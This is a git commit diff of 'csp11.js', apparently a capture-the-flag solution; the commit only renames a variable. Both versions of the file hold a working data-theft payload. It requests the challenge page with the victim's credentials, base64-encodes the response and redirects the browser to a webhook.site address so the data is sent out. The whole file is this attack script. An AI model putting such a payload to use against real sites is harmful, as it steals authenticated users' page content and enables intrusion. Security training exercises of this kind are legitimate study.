a3a19377b67daca175ed359c7f7183a05cc04a91
Lê Ngọc Hoa <68491164+lengochoa7112000@users.noreply.github.com>
2022-09-04 08:46:13 +0700

    Update csp11.js

--- csp11.js
+++ csp11.js
@@ -1,10 +1,10 @@
-var oReq = new XMLHttpRequest();
-oReq.onreadystatechange = function(){
-if(oReq.readyState === XMLHttpRequest.DONE) {
-    console.log(oReq.responseText);
-    document.location='https://webhook.site/9fa288a1-051f-42cb-b13f-0e66604e6cf3?data='+btoa(oReq.responseText);
+var hoa = new XMLHttpRequest();
+hoa.onreadystatechange = function(){
+if(hoa.readyState === XMLHttpRequest.DONE) {
+    console.log(hoa.responseText);
+    document.location='https://webhook.site/9fa288a1-051f-42cb-b13f-0e66604e6cf3?data='+btoa(hoa.responseText);
 }
 };
-oReq.open('GET', 'http://challenge:8080/');
-oReq.withCredentials = true;
-oReq.send();
+hoa.open('GET', 'http://challenge:8080/');
+hoa.withCredentials = true;
+hoa.send();
